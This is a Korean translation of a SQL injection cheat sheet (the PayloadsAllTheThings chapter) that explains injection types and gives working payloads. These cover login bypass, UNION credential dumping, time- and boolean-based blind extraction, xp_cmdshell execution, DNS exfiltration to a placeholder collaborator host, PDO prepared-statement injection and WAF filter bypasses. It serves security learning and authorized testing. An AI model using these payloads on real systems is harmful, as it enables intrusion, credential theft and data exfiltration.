---
# generated-by: scripts/sync.py — 직접 수정 금지, 볼트 원본을 고치세요
title: "보안-06. SQL Injection"
date: 2026-06-16
tags: [security, sql-injection, sqli, union, blind, error-based, waf-bypass, authentication-bypass]
summary: "PayloadsAllTheThings SQL Injection 챕터 전문 번역."
source: "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md"
slug: "sql-injection"
---

SQL Injection(SQLi)은 공격자가 애플리케이션이 데이터베이스에 보내는 쿼리를 조작할 수 있게 해주는 보안 취약점이다. 웹 애플리케이션 취약점 중 가장 흔하고 심각한 유형 중 하나로, 공격자가 DB에서 임의의 SQL 코드를 실행할 수 있게 한다. 이는 데이터 무단 접근, 데이터 변조, 심한 경우 DB 서버 전체 장악으로 이어질 수 있다.

## 목차

* [치트시트](#치트시트)
* [도구](#도구)
* [진입점 탐지](#진입점-탐지)
* [DBMS 식별](#dbms-식별)
* [인증 우회](#인증-우회)
    * [Raw MD5와 SHA1](#raw-md5와-sha1)
* [UNION 기반 인젝션](#union-기반-인젝션)
* [Error 기반 인젝션](#error-기반-인젝션)
* [Blind 인젝션](#blind-인젝션)
    * [Boolean 기반 인젝션](#boolean-기반-인젝션)
    * [Blind Error 기반 인젝션](#blind-error-기반-인젝션)
    * [Time 기반 인젝션](#time-기반-인젝션)
    * [Out of Band (OAST)](#out-of-band-oast)
* [Stacked 기반 인젝션](#stacked-기반-인젝션)
* [Polyglot 인젝션](#polyglot-인젝션)
* [Routed 인젝션](#routed-인젝션)
* [Second Order SQL Injection](#second-order-sql-injection)
* [PDO Prepared Statements](#pdo-prepared-statements)
* [WAF 우회 (일반)](#waf-우회-일반)
    * [공백 금지](#공백-금지)
    * [쉼표 금지](#쉼표-금지)
    * [등호 금지](#등호-금지)
    * [대소문자 변형](#대소문자-변형)
* [실습](#실습)
* [참고](#참고)

## 치트시트

* [MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
* [MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
* [OracleSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md)
* [PostgreSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)
* [SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
* [Cassandra Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Cassandra%20Injection.md)
* [DB2 Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/DB2%20Injection.md)
* [SQLmap](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLmap.md)

## 도구

* [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap) — SQL 인젝션 자동 탐지 및 DB 탈취 도구
* [r0oth3x49/ghauri](https://github.com/r0oth3x49/ghauri) — SQLi 보안 결함 탐지·익스플로잇을 자동화하는 크로스플랫폼 고급 도구

## 진입점 탐지

SQL 인젝션에서 진입점 탐지는 사용자 입력이 SQL 쿼리에 포함되기 전에 제대로 살균(sanitize)되지 않는 위치를 찾는 과정이다.

* **에러 메시지**: 입력 필드에 특수문자(예: 작은따옴표 `'`)를 넣으면 SQL 에러가 발생할 수 있다. 애플리케이션이 상세 에러 메시지를 표시한다면, SQL 인젝션 가능 지점일 수 있다.
    * 단순 문자: `'`, `"`, `;`, `)`, `*`
    * URL 인코딩: `%27`, `%22`, `%23`, `%3B`, `%29`, `%2A`
    * 이중 인코딩: `%%2727`, `%25%27`
    * 유니코드 문자: `U+02BA`, `U+02B9`
        * MODIFIER LETTER DOUBLE PRIME (`U+02BA`, `%CA%BA`로 인코딩)은 `U+0022` 큰따옴표(")로 변환됨
        * MODIFIER LETTER PRIME (`U+02B9`, `%CA%B9`로 인코딩)은 `U+0027` 어포스트로피(')로 변환됨

* **동어반복(Tautology) 기반 SQL 인젝션**: 항상 참인 조건을 입력해 취약점을 테스트한다. 예를 들어 아이디 필드에 `admin' OR '1'='1`을 입력하면, 시스템이 취약할 경우 admin으로 로그인될 수 있다.
    * 문자열 이어붙이기

      ```sql
      `+HERP
      '||'DERP
      '+'herp
      ' 'DERP
      '%20'HERP
      '%2B'HERP
      ```

    * 논리 테스트

      ```sql
      page.asp?id=1 or 1=1 -- true
      page.asp?id=1' or 1=1 -- true
      page.asp?id=1" or 1=1 -- true
      page.asp?id=1 and 1=2 -- false
      ```

* **타이밍 공격**: 의도적인 지연을 일으키는 SQL 명령(MySQL의 `SLEEP`, `BENCHMARK` 함수 등)을 입력해 주입 가능 지점을 찾는다. 입력 후 응답이 비정상적으로 오래 걸리면 취약할 수 있다.

## DBMS 식별

### 키워드 기반 DBMS 식별

특정 SQL 키워드는 특정 DBMS에서만 동작한다. 이 키워드들을 인젝션 시도에 넣고 응답을 관찰하면 사용 중인 DBMS 유형을 파악할 수 있다.

| DBMS        | SQL 페이로드                              |
|-------------|-------------------------------------------|
| MySQL       | `conv('a',16,2)=conv('a',16,2)`           |
| MySQL       | `connection_id()=connection_id()`         |
| MySQL       | `crc32('MySQL')=crc32('MySQL')`           |
| MSSQL       | `BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)` |
| MSSQL       | `@@CONNECTIONS>0`                         |
| MSSQL       | `@@CONNECTIONS=@@CONNECTIONS`             |
| MSSQL       | `@@CPU_BUSY=@@CPU_BUSY`                   |
| MSSQL       | `USER_ID(1)=USER_ID(1)`                   |
| ORACLE      | `ROWNUM=ROWNUM`                           |
| ORACLE      | `RAWTOHEX('AB')=RAWTOHEX('AB')`           |
| ORACLE      | `LNNVL(0=123)`                            |
| POSTGRESQL  | `5::int=5`                                |
| POSTGRESQL  | `5::integer=5`                            |
| POSTGRESQL  | `pg_client_encoding()=pg_client_encoding()` |
| POSTGRESQL  | `get_current_ts_config()=get_current_ts_config()` |
| POSTGRESQL  | `quote_literal(42.5)=quote_literal(42.5)` |
| POSTGRESQL  | `current_database()=current_database()`   |
| SQLITE      | `sqlite_version()=sqlite_version()`       |
| SQLITE      | `last_insert_rowid()>1`                   |
| SQLITE      | `last_insert_rowid()=last_insert_rowid()` |
| MSACCESS    | `val(cvar(1))=1`                          |
| MSACCESS    | `IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0`      |

### 에러 기반 DBMS 식별

DBMS마다 문제 발생 시 반환하는 에러 메시지가 다르다. 에러를 유발하고 특정 메시지를 분석하면 DBMS 유형을 파악할 수 있다.

| DBMS                | 에러 메시지 예시                                                                          | 페이로드 예시 |
|---------------------|------------------------------------------------------------------------------------------|--------------|
| MySQL               | `You have an error in your SQL syntax; ... near '' at line 1`                            | `'`          |
| PostgreSQL          | `ERROR: unterminated quoted string at or near "'"`                                       | `'`          |
| PostgreSQL          | `ERROR: syntax error at or near "1"`                                                     | `1'`         |
| Microsoft SQL Server| `Unclosed quotation mark after the character string ''.`                                 | `'`          |
| Microsoft SQL Server| `Incorrect syntax near ''.`                                                              | `'`          |
| Microsoft SQL Server| `The conversion of the varchar value to data type int resulted in an out-of-range value.`| `1'`         |
| Oracle              | `ORA-00933: SQL command not properly ended`                                              | `'`          |
| Oracle              | `ORA-01756: quoted string not properly terminated`                                       | `'`          |
| Oracle              | `ORA-00923: FROM keyword not found where expected`                                       | `1'`         |

## 인증 우회

일반적인 인증 메커니즘에서 사용자는 아이디와 비밀번호를 제출한다. 애플리케이션은 보통 이 자격증명을 DB에 대조한다. 예를 들어 SQL 쿼리는 다음과 같다:

```sql
SELECT * FROM users WHERE username = 'user' AND password = 'pass';
```

공격자는 아이디나 비밀번호 필드에 악성 SQL 코드를 주입하려 시도한다. 예를 들어 아이디 필드에 아래를 입력하면:

```sql
' OR '1'='1'--
```

아이디 필드에 항상 참인 구문을 주입하고 나머지 SQL 쿼리를 주석 처리한다. 결과 쿼리가 비밀번호를 더 이상 검사하지 않으므로 비밀번호 필드에는 무엇을 입력해도 된다.

```sql
SELECT * FROM users WHERE username = '' OR '1'='1'--' AND password = '';
```

여기서 `'1'='1'`은 항상 참이므로, 쿼리가 유효한 사용자를 반환해 인증 검사를 사실상 우회한다.

> ⚠️ 이 경우 DB는 테이블의 모든 사용자와 일치하므로 결과 배열을 반환한다. 서버 측에서 결과가 하나만 오길 기대했다면 오류가 발생한다. `LIMIT` 절을 추가해 반환 행 수를 제한한다.

아이디 필드에 아래 페이로드를 제출하면 DB의 첫 번째 사용자로 로그인된다. 정확한 아이디를 사용하면서 비밀번호 필드에도 페이로드를 주입해 특정 사용자를 타겟팅할 수도 있다.

```sql
' or 1=1 limit 1 --
```

> ⚠️ 이 페이로드는 항상 참을 반환하므로 무분별하게 사용하지 말 것. 세션, 파일, 설정, DB 데이터를 의도치 않게 삭제할 수 있는 엔드포인트와 상호작용할 수 있다.

* [Auth_Bypass.txt](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass.txt)

### Raw MD5와 SHA1

PHP에서 선택적 `binary` 파라미터를 true로 설정하면, `md5` 다이제스트가 길이 16의 raw 바이너리 형식으로 반환된다. 사용자가 제출한 비밀번호의 MD5 해시를 검사하는 아래 PHP 코드를 보자.

```php
sql = "SELECT * FROM admin WHERE pass = '".md5($password,true)."'";
```

공격자는 `md5($password,true)` 함수의 결과에 작은따옴표가 포함돼 SQL 컨텍스트를 탈출하는 페이로드를 만들 수 있다. 예를 들어 `' or 'SOMETHING`.

| 해시 | 입력                                    | 출력 (Raw)                   | 페이로드 |
|------|-----------------------------------------|------------------------------|---------|
| md5  | ffifdyop                                | `'or'6\]..!r,..b`            | `'or'`  |
| md5  | 129581926211651571912466741651878684928 | `ÚT0Do#ßÁ'or'8`              | `'or'`  |
| sha1 | 3fDf                                    | `Q..u'='..@..[.t.- o.._-!`  | `'='`   |
| sha1 | 178374                                  | `ÜÛ¾}_ia!8Wm'/*´Õ`           | `'/*`   |
| sha1 | 17                                      | `Ùp2ûjww%6\``                | `\`     |

이 동작을 악용해 컨텍스트를 탈출함으로써 인증을 우회할 수 있다.

```php
sql1 = "SELECT * FROM admin WHERE pass = '".md5("ffifdyop", true)."'";
sql1 = "SELECT * FROM admin WHERE pass = ''or'6...]'";
```

### 해시된 비밀번호

2025년 기준으로 애플리케이션은 평문 비밀번호를 거의 저장하지 않는다. 대신 인증 시스템은 비밀번호의 표현값(보통 salt와 함께 키 유도 함수로 계산한 해시)을 사용한다. 이 변화는 일부 고전적인 SQLi 우회 방식의 메커니즘을 바꾼다. UNION으로 행을 주입하는 공격자는 이제 사용자의 원래 비밀번호가 아니라 애플리케이션이 기대하는 저장 표현값과 일치하는 값을 제공해야 한다.

순진한 인증 흐름은 보통 다음 단계를 거친다:

* DB에서 사용자 레코드를 조회한다 (예: `SELECT username, password_hash FROM users WHERE username = ?`).
* DB에서 저장된 `password_hash`를 받는다.
* 설정된 알고리즘으로 `hash(입력_비밀번호)`를 로컬에서 계산한다.
* `stored_password_hash == hash(입력_비밀번호)`를 비교한다.

공격자가 UNION을 이용해 결과 셋에 추가 행을 주입할 수 있다면, 공격자가 제어하는 `stored_password_hash`를 애플리케이션이 받게 만들 수 있다. 주입된 해시가 앱이 계산한 `hash(공격자_비밀번호)`와 같으면 비교에 성공하고 공격자는 주입한 username으로 인증된다.

```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'--
```

* `AND 1=0`: 요청이 거짓이 되도록 강제한다.
* `SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'`: 필요한 만큼 컬럼을 선택한다. 여기서 `161ebd7d45089b3446ee4e0d86dbcf92`는 `MD5("P@ssw0rd")`에 해당한다.

애플리케이션이 `MD5("P@ssw0rd")`를 계산해 `161ebd7d45089b3446ee4e0d86dbcf92`와 같으면, 로그인 비밀번호로 `"P@ssw0rd"`를 제출하면 검사를 통과한다.

앱이 `salt`와 `KDF(salt, password)`를 저장하면 이 방법은 실패한다. 공격자가 salt와 KDF 파라미터를 알거나 제어하지 못하는 한, 단일 정적 해시 주입은 사용자별 salted 결과와 일치할 수 없다.

## UNION 기반 인젝션

일반 SQL 쿼리는 하나의 테이블에서 데이터를 가져온다. `UNION` 연산자는 여러 `SELECT` 문을 결합할 수 있다. 애플리케이션이 SQL 인젝션에 취약하면, 공격자는 원래 쿼리에 `UNION` 문을 덧붙이는 조작된 SQL 쿼리를 주입할 수 있다.

취약한 웹 애플리케이션이 product ID를 기반으로 제품 상세 정보를 DB에서 가져온다고 가정하자:

```sql
SELECT product_name, product_price FROM products WHERE product_id = 'input_id';
```

공격자는 `input_id`를 변조해 `users` 같은 다른 테이블의 데이터를 포함시킬 수 있다.

```sql
1' UNION SELECT username, password FROM users --
```

페이로드 제출 후 쿼리는 다음 SQL이 된다:

```sql
SELECT product_name, product_price FROM products WHERE product_id = '1' UNION SELECT username, password FROM users --';
```

> ⚠️ 두 SELECT 절의 컬럼 수가 같아야 한다.

## Error 기반 인젝션

Error 기반 SQL 인젝션은 DB에서 반환되는 에러 메시지에 의존해 DB 구조에 관한 정보를 수집하는 기법이다. SQL 쿼리의 입력 파라미터를 조작해 DB가 에러 메시지를 생성하도록 만든다. 이 에러들은 테이블명, 컬럼명, 데이터 타입 같은 중요한 세부 정보를 노출할 수 있고, 이를 추가 공격에 활용할 수 있다.

예를 들어 PostgreSQL에서 SQL 쿼리에 아래 페이로드를 주입하면, LIMIT 절이 숫자값을 기대하므로 에러가 발생한다.

```sql
LIMIT CAST((SELECT version()) as numeric)
```

에러가 `version()` 출력을 노출한다.

```
ERROR: invalid input syntax for type numeric: "PostgreSQL 9.5.25 on x86_64-pc-linux-gnu"
```

## Blind 인젝션

Blind SQL 인젝션은 DB에 참/거짓 질문을 하고 애플리케이션의 응답으로 답을 판단하는 SQL 인젝션 공격 유형이다.

### Boolean 기반 인젝션

DB에 SQL 쿼리를 보내 쿼리가 TRUE 또는 FALSE를 반환하느냐에 따라 애플리케이션이 다른 결과를 반환하게 만드는 공격이다. 공격자는 애플리케이션 동작의 차이를 기반으로 정보를 추론할 수 있다.

페이지 크기, HTTP 응답 코드, 또는 페이지에서 누락된 부분이 Boolean 기반 Blind SQL 인젝션 성공 여부를 탐지하는 강력한 지표다.

`@@hostname` 변수의 내용을 복구하는 단순 예시:

**주입 지점 식별 및 취약점 확인**: 참/거짓으로 평가되는 페이로드를 주입해 SQL 인젝션 취약점을 확인한다.

```
http://example.com/item?id=1 AND 1=1 -- (기대: 정상 응답)
http://example.com/item?id=1 AND 1=2 -- (기대: 다른 응답 또는 에러)
```

**호스트명 길이 추출**: 응답이 일치를 나타낼 때까지 증가시키며 호스트명 길이를 추측한다.

```
http://example.com/item?id=1 AND LENGTH(@@hostname)=1 -- (기대: 변화 없음)
http://example.com/item?id=1 AND LENGTH(@@hostname)=2 -- (기대: 변화 없음)
http://example.com/item?id=1 AND LENGTH(@@hostname)=N -- (기대: 응답 변화)
```

**호스트명 문자 추출**: substring과 ASCII 비교로 호스트명의 각 문자를 추출한다.

```
http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) > 64 --
http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) = 104 --
```

이후 `@@hostname`의 모든 문자를 찾을 때까지 반복한다. 물론 이 예시가 가장 빠른 방법은 아니다. 속도를 높이려면:

* 이진 탐색으로 문자 추출: 요청 수를 선형에서 로그 시간으로 줄여 데이터 추출 효율을 크게 높인다.

### Blind Error 기반 인젝션

DB에 SQL 쿼리를 보내 쿼리가 성공적으로 반환됐는지 또는 에러를 유발했는지에 따라 애플리케이션이 다른 결과를 반환하게 만드는 공격이다. 이 경우 서버 응답으로 성공 여부만 추론하며, 에러 출력에서 데이터를 추출하지는 않는다.

**예시**: SQLite에서 `json()` 함수를 이용해 에러를 트리거함으로써 주입이 참인지 거짓인지 판단하는 오라클로 사용.

```sql
' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A -- 정상
' AND CASE WHEN 1=2 THEN 1 ELSE json('') END AND 'A'='A -- malformed JSON
```

### Time 기반 인젝션

Time 기반 SQL 인젝션은 특정 쿼리가 참인지 거짓인지 추론하기 위해 DB 지연에 의존하는 Blind SQL 인젝션 공격 유형이다. 애플리케이션이 DB 쿼리에서 직접적인 피드백을 표시하지 않지만 시간 지연 SQL 명령 실행을 허용할 때 사용한다. 공격자는 DB 응답에 걸리는 시간을 분석해 간접적으로 정보를 수집할 수 있다.

* DB의 기본 `SLEEP` 함수

```sql
' AND SLEEP(5)/*
' AND '1'='1' AND SLEEP(5)
' ; WAITFOR DELAY '00:00:05' --
```

* 완료에 시간이 많이 걸리는 무거운 쿼리. 보통 암호화 함수가 해당됨.

```sql
BENCHMARK(2000000,MD5(NOW()))
```

Time 기반 SQL 인젝션으로 DB 버전을 복구하는 기본 예시:

```sql
http://example.com/item?id=1 AND IF(SUBSTRING(VERSION(), 1, 1) = '5', BENCHMARK(1000000, MD5(1)), 0) --
```

서버 응답이 수 초 걸린다면 버전이 '5'로 시작한다는 의미다.

### Out of Band (OAST)

Out-of-Band SQL 인젝션(OOB SQLi)은 공격자가 대안적인 통신 채널을 이용해 DB에서 데이터를 추출하는 방식이다. HTTP 응답 내에서 즉각적인 피드백을 받는 기존 기법과 달리, OOB SQLi는 DB 서버가 공격자 제어 서버로 네트워크 연결을 맺는 능력에 의존한다. 이 방법은 주입된 SQL 명령의 결과를 직접 볼 수 없거나 서버 응답이 불안정하거나 신뢰할 수 없을 때 특히 유용하다.

DBMS마다 대역 외 연결을 생성하는 다양한 방법이 있으며, 가장 일반적인 기법은 DNS exfiltration이다:

* MySQL

  ```sql
  LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
  SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
  ```

* MSSQL

  ```sql
  SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
  exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
  ```

## Stacked 기반 인젝션

Stacked Queries SQL 인젝션은 세미콜론(`;`) 같은 구분자로 구분해 단일 쿼리에서 여러 SQL 문을 실행하는 기법이다. 이를 통해 공격자는 합법적인 쿼리 다음에 추가적인 악성 SQL 명령을 실행할 수 있다. 모든 DB나 애플리케이션 설정이 stacked queries를 지원하지는 않는다.

```sql
1; EXEC xp_cmdshell('whoami') --
```

## Polyglot 인젝션

Polyglot SQL 인젝션 페이로드는 수정 없이 여러 컨텍스트나 환경에서 성공적으로 실행될 수 있도록 특별히 제작된 SQL 인젝션 공격 문자열이다. 다양한 시나리오에서 유효한 SQL이 되어 웹 애플리케이션이나 DB의 다양한 유형의 검증, 파싱, 실행 로직을 우회할 수 있다.

```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

## Routed 인젝션

> Routed SQL 인젝션은 주입 가능한 쿼리가 출력을 제공하는 것이 아니라, 주입 가능한 쿼리의 출력이 출력을 제공하는 쿼리로 가는 상황이다. — Zenodermus Javanicus

간단히 말해, 첫 번째 SQL 쿼리의 결과가 두 번째 SQL 쿼리를 구성하는 데 사용된다. 일반적인 형식은 `' union select 0xHEXVALUE --`이며, HEX는 두 번째 쿼리를 위한 SQL 인젝션이다.

**예시 1**:

`0x2720756e696f6e2073656c65637420312c3223`은 `' union select 1,2#`의 hex 인코딩이다.

```sql
' union select 0x2720756e696f6e2073656c65637420312c3223#
```

**예시 2**:

`0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061`는 `-1' union select login,password from users-- a`의 hex 인코딩이다.

```sql
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```

## Second Order SQL Injection

Second Order SQL 인젝션은 악성 SQL 페이로드가 처음에 애플리케이션의 DB에 저장됐다가 나중에 같은 애플리케이션의 다른 기능에 의해 실행되는 SQL 인젝션의 하위 유형이다. 1차 SQLi와 달리 인젝션은 즉시 발생하지 않는다. **별도의 단계에서 트리거되며**, 종종 애플리케이션의 다른 부분에서 발생한다.

1. 사용자가 저장되는 입력을 제출한다 (예: 회원가입 또는 프로필 업데이트).

   ```
   Username: attacker'--
   Email: attacker@example.com
   ```

2. 해당 입력이 **검증 없이** 저장되지만 SQL 인젝션을 트리거하지는 않는다.

   ```sql
   INSERT INTO users (username, email) VALUES ('attacker\'--', 'attacker@example.com');
   ```

3. 나중에 애플리케이션이 저장된 데이터를 SQL 쿼리에서 가져와 사용한다.

   ```python
   query = "SELECT * FROM logs WHERE username = '" + user_from_db + "'"
   ```

4. 이 쿼리가 안전하지 않게 구성되면 인젝션이 트리거된다.

## PDO Prepared Statements

PDO(PHP Data Objects)는 DB에 접근하고 상호작용하는 일관되고 안전한 방법을 제공하는 PHP 확장이다. MySQL, PostgreSQL, SQLite 등 여러 유형의 DB에서 일관된 API를 사용할 수 있도록 표준화된 DB 상호작용 방식을 제공하도록 설계됐다.

PDO는 입력 파라미터 바인딩을 허용해 SQL 쿼리의 일부로 실행되기 전에 사용자 데이터가 제대로 살균되도록 한다. 그러나 개발자가 SQL 쿼리 내에 사용자 입력을 허용했다면 여전히 SQL 인젝션에 취약할 수 있다.

**조건**:

* DBMS
    * **MySQL**은 기본적으로 취약하다.
    * **Postgres**는 기본적으로 취약하지 않으나, `PDO::ATTR_EMULATE_PREPARES => true`로 에뮬레이션이 켜져 있으면 취약하다.
    * **SQLite**는 이 공격에 취약하지 않다.

* PDO 문 내 어디서든 SQL 인젝션: `$pdo->prepare("SELECT $INJECT_SQL_HERE...")`.
* `?` 또는 `:parameter`로 다른 SQL 파라미터에 PDO를 사용한다.

    ```php
    $pdo = new PDO(APP_DB_HOST, APP_DB_USER, APP_DB_PASS);
    $col = '`' . str_replace('`', '``', $_GET['col']) . '`';

    $stmt = $pdo->prepare("SELECT $col FROM animals WHERE name = ?");
    $stmt->execute([$_GET['name']]);
    // 또는
    $stmt = $pdo->prepare("SELECT $col FROM animals WHERE name = :name");
    $stmt->execute(['name' => $_GET['name']]);
    ```

**방법론**:

**참고**: PHP 8.3 이하에서는 null 바이트(`\0`) 없이도 인젝션이 발생한다. 공격자는 "`:`" 또는 "`?`"만 밀수입하면 된다.

* `?#\0`으로 SQLi 탐지: `GET /index.php?col=%3f%23%00&name=anything`

    ```
    # 1번째 페이로드: ?#\0
    # 2번째 페이로드: anything
    You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '`'anything'#' at line 1
    ```

* 컬럼명 대신 `` `'x` ``를 강제 선택하고 주석 생성. 백틱을 주입해 컬럼을 수정하고 `;#`으로 SQL 쿼리 종료: `GET /index.php?col=%3f%23%00&name=x%60;%23`

    ```
    # 1번째 페이로드: ?#\0
    # 2번째 페이로드: x`;#
    Column not found: 1054 Unknown column ''x' in 'SELECT'
    ```

* 두 번째 파라미터에 페이로드 주입. `GET /index2.php?col=\%3f%23%00&name=x%60+FROM+(SELECT+table_name+AS+%60'x%60+from+information_schema.tables)y%3b%2523`

    ```
    # 1번째 페이로드: \?#\0
    # 2번째 페이로드: x` FROM (SELECT table_name AS `'x` from information_schema.tables)y;%23
    ALL_PLUGINS
    APPLICABLE_ROLES
    CHARACTER_SETS
    ...
    ```

* 최종 SQL 쿼리

    ```sql
    -- $pdo->prepare 이전
    SELECT `\?#\0` FROM animals WHERE name = ?

    -- $pdo->prepare 이후
    SELECT `\'x` FROM (SELECT table_name AS `\'x` from information_schema.tables)y;#'#\0` FROM animals WHERE name = ?
    ```

## WAF 우회 (일반)

### 공백 금지

일부 웹 애플리케이션은 공백 문자를 차단하거나 제거해 단순 SQL 인젝션 공격을 막으려 한다. 그러나 공격자는 대체 공백 문자, 주석, 괄호를 창의적으로 사용해 이 필터를 우회할 수 있다.

#### 대체 공백 문자

대부분의 DB는 특정 ASCII 제어 문자와 인코딩된 공백(탭, 줄바꿈 등)을 SQL 문에서 공백으로 해석한다. 이 문자들을 인코딩해 공백 기반 필터를 우회할 수 있다.

| 페이로드 예시                | 설명                       |
|------------------------------|----------------------------|
| `?id=1%09and%091=1%09--`    | `%09` = 탭 (`\t`)          |
| `?id=1%0Aand%0A1=1%0A--`    | `%0A` = 줄바꿈 (`\n`)      |
| `?id=1%0Band%0B1=1%0B--`    | `%0B` = 수직 탭            |
| `?id=1%0Cand%0C1=1%0C--`    | `%0C` = 폼 피드            |
| `?id=1%0Dand%0D1=1%0D--`    | `%0D` = 캐리지 리턴 (`\r`) |
| `?id=1%A0and%A01=1%A0--`    | `%A0` = 논브레이킹 스페이스 |

**DB별 ASCII 공백 지원**:

| DBMS         | 지원하는 공백 문자 (Hex)                          |
|--------------|---------------------------------------------------|
| SQLite3      | 0A, 0D, 0C, 09, 20                                |
| MySQL 5      | 09, 0A, 0B, 0C, 0D, A0, 20                        |
| MySQL 3      | 01–1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0|
| PostgreSQL   | 0A, 0D, 0C, 09, 20                                |
| Oracle 11g   | 00, 0A, 0D, 0C, 09, 20                            |
| MSSQL        | 01–1F, 20                                         |

#### 주석과 괄호로 우회

SQL은 주석과 그룹화를 허용해 키워드와 쿼리를 분리할 수 있으므로 공백 필터를 무력화한다:

| 우회                                       | 기법           |
|--------------------------------------------|----------------|
| `?id=1/*comment*/AND/**/1=1/**/--`        | 주석           |
| `?id=1/*!12345UNION*//*!12345SELECT*/1--` | 조건부 주석    |
| `?id=(1)and(1)=(1)--`                     | 괄호           |

### 쉼표 금지

`OFFSET`, `FROM`, `JOIN`으로 우회한다.

| 금지                | 우회                                                              |
|---------------------|-------------------------------------------------------------------|
| `LIMIT 0,1`         | `LIMIT 1 OFFSET 0`                                                |
| `SUBSTR('SQL',1,1)` | `SUBSTR('SQL' FROM 1 FOR 1)`                                      |
| `SELECT 1,2,3,4`    | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d` |

### 등호 금지

LIKE/NOT IN/IN/BETWEEN으로 우회한다.

| 우회      | SQL 예시                                   |
|-----------|--------------------------------------------|
| `LIKE`    | `SUBSTRING(VERSION(),1,1)LIKE(5)`          |
| `NOT IN`  | `SUBSTRING(VERSION(),1,1)NOT IN(4,3)`      |
| `IN`      | `SUBSTRING(VERSION(),1,1)IN(4,3)`          |
| `BETWEEN` | `SUBSTRING(VERSION(),1,1) BETWEEN 3 AND 4` |

### 대소문자 변형

대/소문자로 우회한다.

| 우회  | 기법     |
|-------|----------|
| `AND` | 대문자   |
| `and` | 소문자   |
| `aNd` | 혼합     |

대소문자 구분 없는 키워드 또는 동등한 연산자로 우회한다.

| 금지    | 우회                        |
|---------|-----------------------------|
| `AND`   | `&&`                        |
| `OR`    | `\|\|`                      |
| `=`     | `LIKE`, `REGEXP`, `BETWEEN` |
| `>`     | `NOT BETWEEN 0 AND X`       |
| `WHERE` | `HAVING`                    |

## 실습

* [PortSwigger - WHERE 절 SQL 인젝션으로 숨겨진 데이터 조회](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
* [PortSwigger - 로그인 우회 SQL 인젝션](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
* [PortSwigger - XML 인코딩 필터 우회 SQL 인젝션](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
* [PortSwigger - SQL 전체 실습](https://portswigger.net/web-security/all-labs#sql-injection)
* [Root Me - SQL injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-authentication)
* [Root Me - SQL injection - Authentication - GBK](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-authentication-GBK)
* [Root Me - SQL injection - String](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-String)
* [Root Me - SQL injection - Numeric](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Numeric)
* [Root Me - SQL injection - Routed](https://www.root-me.org/en/Challenges/Web-Server/SQL-Injection-Routed)
* [Root Me - SQL injection - Error](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Error)
* [Root Me - SQL injection - Insert](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Insert)
* [Root Me - SQL injection - File reading](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-File-reading)
* [Root Me - SQL injection - Time based](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Time-based)
* [Root Me - SQL injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Blind)
* [Root Me - SQL injection - Second Order](https://www.root-me.org/en/Challenges/Web-Server/SQL-Injection-Second-Order)
* [Root Me - SQL injection - Filter bypass](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Filter-bypass)
* [Root Me - SQL Truncation](https://www.root-me.org/en/Challenges/Web-Server/SQL-Truncation)

## 참고

* [A Novel Technique for SQL Injection in PDO's Prepared Statements - Adam Kues - 2025년 7월 21일](https://web.archive.org/web/20251017002820/https://slcyber.io/assetnote-security-research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/)
* [Analyzing CVE-2018-6376 – Joomla!, Second Order SQL Injection - Not So Secure - 2018년 2월 9일](https://web.archive.org/web/20180209143119/https://www.notsosecure.com/analyzing-cve-2018-6376/)
* [Implement a Blind Error-Based SQLMap payload for SQLite - soka - 2023년 8월 24일](https://web.archive.org/web/20250513112724/https://sokarepo.github.io/web/2023/08/24/implement-blind-sqlite-sqlmap.html)
